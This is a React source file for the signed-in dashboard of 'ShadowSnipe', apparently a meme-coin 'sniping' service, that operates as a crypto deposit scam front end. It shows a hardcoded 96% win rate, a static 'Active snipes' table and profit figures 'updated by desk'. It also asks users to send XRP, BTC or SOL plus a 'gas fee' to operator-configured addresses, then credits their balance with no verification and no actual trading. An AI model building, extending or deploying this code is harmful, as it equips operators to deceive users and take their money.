import { useEffect, useMemo, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import {
  clearConnection,
  loadConnection,
  shortAddress,
  type Connection,
} from '../lib/wallet'
import { getDb, recordDeposit, type DepositAsset } from '../lib/db'

const WALLET_NAME: Record<string, string> = {
  metamask: 'MetaMask',
  walletconnect: 'WalletConnect',
  coinbase: 'Coinbase Wallet',
  phantom: 'Phantom',
  okx: 'OKX Wallet',
  trust: 'Trust Wallet',
  binance: 'Binance Wallet',
  blockchain: 'Blockchain.com',
  bybit: 'Bybit Wallet',
}

/** Meme coins for the snipe dropdown. Addresses are illustrative, not all real. */
const MEME_TOKENS = [
  { name: 'PEPE', address: '0x6982508145454Ce325dDbE47a25d4ec3d2311933' },
  { name: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE' },
  { name: 'FLOKI', address: '0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E' },
  { name: 'MOG', address: '0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a' },
  { name: 'TURBO', address: '0xA35923162C49cF95e6BF26623385eb431ad920D3' },
  { name: 'ELON', address: '0x761D38e5ddf6ccf6Cf7c55759d5210750B5D60F3' },
  { name: 'WOJAK', address: '0x5026F006B85729a8b14553FAE6af249aD16c9aaB' },
  { name: 'BRETT', address: '0x532f27101965dd16442E59d40670FaF5eBB142E4' },
  { name: 'ANDY', address: '0x68BbEd6A47194EFf1CF514B50Ea91895597fc91E' },
  { name: 'DOGE', address: '0x4206931337dc273a630d328dA6441786BfaD668f' },
]

type Asset = { id: DepositAsset; name: string; qr: string }
const ASSETS: Asset[] = [
  { id: 'XRP', name: 'XRP', qr: '/deposits/xrp.png' },
  { id: 'BTC', name: 'Bitcoin', qr: '/deposits/btc.png' },
  { id: 'SOL', name: 'Solana', qr: '/deposits/sol.png' },
]

const money = (n: number) =>
  `${n < 0 ? '-' : ''}$${Math.abs(n).toLocaleString(undefined, { maximumFractionDigits: 2 })}`

type UserStats = { username?: string; deposited: number; profit: number; pnl: number }
type DepositConfig = { addrs: Record<DepositAsset, string>; gasUsd: number }
type Step = 'form' | 'deposit' | 'done' | 'error'

/**
 * The signed-in area. Reads the persisted connection; if there isn't one we
 * bounce back to the landing page so the connect flow is the only way in.
 */
export function Dashboard() {
  const navigate = useNavigate()
  const [conn, setConn] = useState<Connection | null>(null)
  const [stats, setStats] = useState<UserStats>({ deposited: 0, profit: 0, pnl: 0 })
  const [cfg, setCfg] = useState<DepositConfig | null>(null)

  // Snipe form.
  const initialName = useMemo(
    () => MEME_TOKENS[Math.floor(Math.random() * MEME_TOKENS.length)].name,
    [],
  )
  const [tokenName, setTokenName] = useState(initialName)
  const token =
    MEME_TOKENS.find((t) => t.name === tokenName)?.address ?? MEME_TOKENS[0].address
  const [amount, setAmount] = useState('100')

  // Deposit flow.
  const [step, setStep] = useState<Step>('form')
  const [asset, setAsset] = useState<DepositAsset>('XRP')
  const [busy, setBusy] = useState(false)
  const [errMsg, setErrMsg] = useState('')

  const amountUsd = Number(amount) || 0
  const gasUsd = cfg?.gasUsd ?? 0
  const totalUsd = amountUsd + gasUsd

  // Pull the user's stats + the current deposit addresses from the JSON DB.
  async function refresh(address: string) {
    try {
      const db = await getDb()
      const me = db.connections.find(
        (c) => c.address.toLowerCase() === address.toLowerCase(),
      )
      setStats({
        username: me?.username,
        deposited: me?.deposited ?? 0,
        profit: me?.profit ?? 0,
        pnl: me?.pnl ?? 0,
      })
      setCfg({
        addrs: {
          XRP: db.depositWalletXrp,
          BTC: db.depositWalletBtc,
          SOL: db.depositWalletSol,
        },
        gasUsd: db.gasFeeUsd,
      })
    } catch (e) {
      console.warn('Could not load dashboard data:', e)
    }
  }

  useEffect(() => {
    const c = loadConnection()
    if (!c) {
      navigate('/', { replace: true })
      return
    }
    setConn(c)
    refresh(c.address)
  }, [navigate])

  if (!conn) return null

  const displayName = stats.username || conn.username
  const depositAddress = cfg?.addrs[asset] ?? ''

  function disconnect() {
    clearConnection()
    navigate('/', { replace: true })
  }

  function startDeposit() {
    setErrMsg('')
    if (amountUsd <= 0) {
      setErrMsg('Enter a deposit amount first.')
      return
    }
    setStep('deposit')
  }

  async function confirmDeposit() {
    if (!conn) return
    setBusy(true)
    setErrMsg('')
    try {
      await recordDeposit({
        address: conn.address,
        walletId: conn.walletId,
        asset,
        amountUsd,
        gasUsd,
      })
      await refresh(conn.address)
      setStep('done')
    } catch (e) {
      setErrMsg((e as Error).message)
      setStep('error')
    } finally {
      setBusy(false)
    }
  }

  function resetFlow() {
    setStep('form')
    setErrMsg('')
  }

  async function copyAddress() {
    try {
      await navigator.clipboard.writeText(depositAddress)
    } catch {
      /* clipboard may be blocked — ignore */
    }
  }

  return (
    <div className="min-h-dvh bg-[var(--color-void)] text-[var(--color-fg)]">
      {/* subtle grid backdrop */}
      <div
        className="pointer-events-none fixed inset-0 -z-10 opacity-[0.35]"
        style={{
          background:
            'linear-gradient(var(--color-line) 1px, transparent 1px), linear-gradient(90deg, var(--color-line) 1px, transparent 1px)',
          backgroundSize: '40px 40px',
          maskImage: 'radial-gradient(ellipse at top, #000 30%, transparent 75%)',
        }}
      />

      {/* top bar */}
      <header className="glass sticky top-0 z-30 border-b border-[var(--color-line)]">
        <div className="mx-auto flex max-w-7xl items-center justify-between px-5 py-4 sm:px-8">
          <button onClick={() => navigate('/')} className="group flex items-center gap-2.5">
            <span className="relative grid h-8 w-8 place-items-center">
              <span className="absolute inset-0 rounded-md border border-[var(--color-snipe)]/60" />
              <span className="absolute h-[1px] w-5 bg-[var(--color-snipe)]" />
              <span className="absolute h-5 w-[1px] bg-[var(--color-snipe)]" />
              <span className="h-1.5 w-1.5 rounded-full bg-[var(--color-snipe)] glow-snipe" />
            </span>
            <span className="font-[family-name:var(--font-display)] text-lg font-bold tracking-tight">
              Shadow<span className="text-[var(--color-snipe)]">Snipe</span>
            </span>
          </button>

          <div className="flex items-center gap-3">
            <span className="hidden items-center gap-2 rounded-lg border border-[var(--color-line)] bg-white/[0.03] px-3 py-2 text-sm sm:flex">
              <span className="h-2 w-2 rounded-full bg-[var(--color-snipe)] glow-snipe" />
              <span className="font-[family-name:var(--font-mono)] text-[var(--color-snipe)]">
                {shortAddress(conn.address)}
              </span>
              <span className="text-xs text-[var(--color-faint)]">
                · {WALLET_NAME[conn.walletId] ?? conn.walletId}
              </span>
            </span>
            <button
              onClick={disconnect}
              className="rounded-lg border border-[var(--color-line)] px-4 py-2 text-sm font-semibold transition hover:border-red-400/50 hover:text-red-300"
            >
              Disconnect
            </button>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-7xl px-5 py-8 sm:px-8">
        <div className="reveal">
          <p className="text-sm text-[var(--color-muted)]">
            {conn.chain === 'solana' ? 'Solana' : 'EVM'} wallet connected
          </p>
          <h1 className="mt-1 font-[family-name:var(--font-display)] text-3xl font-bold tracking-tight sm:text-4xl">
            Welcome back{displayName ? `, ${displayName}` : ', sniper'}
          </h1>
        </div>

        {/* stat cards */}
        <section className="mt-8 grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-4">
          <StatCard label="Amount deposited" value={money(stats.deposited)} note="your balance" />
          <StatCard
            label="Profit"
            value={money(stats.profit)}
            note="updated by desk"
            accent={stats.profit > 0}
          />
          <StatCard
            label="PnL"
            value={money(stats.pnl)}
            note="all time"
            accent={stats.pnl > 0}
          />
          <StatCard label="Win rate" value="96%" note="+5% this week" accent />
        </section>

        {/* main grid */}
        <section className="mt-6 grid grid-cols-1 gap-4 lg:grid-cols-3">
          <div className="glass rounded-2xl border border-[var(--color-line)] p-6 lg:col-span-2">
            <div className="mb-4 flex items-center justify-between">
              <h2 className="font-[family-name:var(--font-display)] text-lg font-bold">
                Active snipes
              </h2>
              <span className="rounded-md bg-[var(--color-snipe)]/15 px-2 py-1 text-xs font-medium text-[var(--color-snipe)]">
                Live
              </span>
            </div>
            <div className="overflow-hidden rounded-xl border border-[var(--color-line)]">
              <table className="w-full text-left text-sm">
                <thead className="bg-white/[0.02] text-[var(--color-faint)]">
                  <tr>
                    <th className="px-4 py-3 font-medium">Token</th>
                    <th className="px-4 py-3 font-medium">Status</th>
                  </tr>
                </thead>
                <tbody>
                  {SNIPES.map((row) => (
                    <tr key={row.token} className="border-t border-[var(--color-line)]">
                      <td className="px-4 py-3 font-[family-name:var(--font-mono)]">{row.token}</td>
                      <td className="px-4 py-3">
                        <span className="rounded-md bg-white/[0.04] px-2 py-0.5 text-xs">
                          {row.status}
                        </span>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>

          {/* New snipe / deposit flow */}
          <div className="glass rounded-2xl border border-[var(--color-line)] p-6">
            <h2 className="mb-4 font-[family-name:var(--font-display)] text-lg font-bold">
              New snipe
            </h2>

            {step === 'form' && (
              <>
                <label className="block text-sm text-[var(--color-muted)]">Token</label>
                <select
                  value={tokenName}
                  onChange={(e) => setTokenName(e.target.value)}
                  className="mt-1.5 w-full appearance-none rounded-lg border border-[var(--color-line)] bg-white/[0.02] px-3 py-2.5 text-sm outline-none transition focus:border-[var(--color-snipe)]/60"
                >
                  {MEME_TOKENS.map((t) => (
                    <option key={t.name} value={t.name} className="bg-[var(--color-panel)]">
                      {t.name}
                    </option>
                  ))}
                </select>
                <p className="mt-1.5 break-all font-[family-name:var(--font-mono)] text-xs text-[var(--color-faint)]">
                  {token}
                </p>

                <label className="mt-4 block text-sm text-[var(--color-muted)]">
                  Deposit amount (USD)
                </label>
                <input
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  inputMode="decimal"
                  placeholder="100"
                  className="mt-1.5 w-full rounded-lg border border-[var(--color-line)] bg-white/[0.02] px-3 py-2.5 font-[family-name:var(--font-mono)] text-sm outline-none transition focus:border-[var(--color-snipe)]/60"
                />

                <button
                  onClick={startDeposit}
                  className="mt-5 w-full rounded-lg bg-[var(--color-snipe)] px-5 py-2.5 font-semibold text-black transition hover:brightness-110"
                >
                  Arm snipe
                </button>
                {errMsg && <p className="mt-3 text-center text-xs text-red-300">{errMsg}</p>}
                <p className="mt-3 text-center text-xs text-[var(--color-faint)]">
                  Deposit to snipe. A {money(gasUsd)} gas fee is added and sent to the same
                  address.
                </p>
              </>
            )}

            {step === 'deposit' && (
              <>
                <div className="mb-3 grid grid-cols-3 gap-2">
                  {ASSETS.map((a) => (
                    <button
                      key={a.id}
                      onClick={() => setAsset(a.id)}
                      className={`rounded-lg border px-2 py-2 text-sm font-semibold transition ${
                        asset === a.id
                          ? 'border-[var(--color-snipe)] bg-[var(--color-snipe)]/15 text-[var(--color-snipe)]'
                          : 'border-[var(--color-line)] text-[var(--color-muted)] hover:bg-white/5'
                      }`}
                    >
                      {a.id}
                    </button>
                  ))}
                </div>

                <div className="rounded-xl border border-[var(--color-line)] bg-white/[0.02] p-4 text-center">
                  <img
                    src={ASSETS.find((a) => a.id === asset)!.qr}
                    alt={`${asset} deposit QR`}
                    className="mx-auto h-44 w-44 rounded-lg bg-white object-contain p-1"
                  />
                  <p className="mt-3 text-xs text-[var(--color-muted)]">
                    Send to this {asset} address
                  </p>
                  <p className="mt-1 break-all font-[family-name:var(--font-mono)] text-xs text-[var(--color-snipe)]">
                    {depositAddress || '—'}
                  </p>
                  <button
                    onClick={copyAddress}
                    className="mt-2 rounded-md border border-[var(--color-line)] px-3 py-1 text-xs transition hover:bg-white/5"
                  >
                    Copy address
                  </button>
                </div>

                <div className="mt-4 space-y-1 rounded-lg border border-[var(--color-line)] px-3 py-2 text-sm">
                  <Row label="Deposit" value={money(amountUsd)} />
                  <Row label="Gas fee" value={money(gasUsd)} />
                  <div className="my-1 h-px bg-[var(--color-line)]" />
                  <Row label="Total to send" value={money(totalUsd)} strong />
                </div>

                <button
                  onClick={confirmDeposit}
                  disabled={busy}
                  className="mt-4 w-full rounded-lg bg-[var(--color-snipe)] px-5 py-2.5 font-semibold text-black transition hover:brightness-110 disabled:opacity-60"
                >
                  {busy ? 'Recording…' : "I've sent the deposit"}
                </button>
                <button
                  onClick={resetFlow}
                  className="mt-2 w-full rounded-lg border border-[var(--color-line)] px-5 py-2 text-sm font-semibold transition hover:bg-white/5"
                >
                  Back
                </button>
                {errMsg && <p className="mt-3 text-center text-xs text-red-300">{errMsg}</p>}
              </>
            )}

            {step === 'done' && (
              <div className="flex flex-col items-center gap-3 py-6 text-center">
                <div className="grid h-14 w-14 place-items-center rounded-full bg-[var(--color-snipe)]/15 text-2xl glow-snipe">
                  ✓
                </div>
                <p className="font-medium">Deposit submitted</p>
                <p className="text-sm text-[var(--color-muted)]">
                  {money(amountUsd)} added to your balance. The desk will confirm it shortly.
                </p>
                <button
                  onClick={resetFlow}
                  className="mt-2 w-full rounded-lg bg-[var(--color-snipe)] px-5 py-2.5 font-semibold text-black transition hover:brightness-110"
                >
                  New snipe
                </button>
              </div>
            )}

            {step === 'error' && (
              <div className="flex flex-col items-center gap-3 py-6 text-center">
                <div className="grid h-14 w-14 place-items-center rounded-full bg-red-500/15 text-2xl">
                  ⚠
                </div>
                <p className="font-medium">Couldn’t record the deposit</p>
                <p className="text-sm text-[var(--color-muted)]">{errMsg}</p>
                <button
                  onClick={() => setStep('deposit')}
                  className="mt-2 w-full rounded-lg bg-[var(--color-snipe)] px-5 py-2.5 font-semibold text-black transition hover:brightness-110"
                >
                  Try again
                </button>
              </div>
            )}
          </div>
        </section>
      </main>
    </div>
  )
}

function StatCard({
  label,
  value,
  note,
  accent,
}: {
  label: string
  value: string
  note: string
  accent?: boolean
}) {
  return (
    <div className="glass rounded-2xl border border-[var(--color-line)] p-5">
      <p className="text-sm text-[var(--color-muted)]">{label}</p>
      <p className="mt-2 font-[family-name:var(--font-display)] text-3xl font-bold">{value}</p>
      <p className={`mt-1 text-xs ${accent ? 'text-[var(--color-snipe)]' : 'text-[var(--color-faint)]'}`}>
        {note}
      </p>
    </div>
  )
}

function Row({ label, value, strong }: { label: string; value: string; strong?: boolean }) {
  return (
    <div className="flex items-center justify-between">
      <span className="text-[var(--color-muted)]">{label}</span>
      <span className={strong ? 'font-bold text-[var(--color-snipe)]' : 'font-[family-name:var(--font-mono)]'}>
        {value}
      </span>
    </div>
  )
}

const SNIPES = [
  { token: 'PEPE/WETH', status: 'Armed' },
  { token: 'WIF/SOL', status: 'Filled' },
  { token: 'BONK/SOL', status: 'Watching' },
]
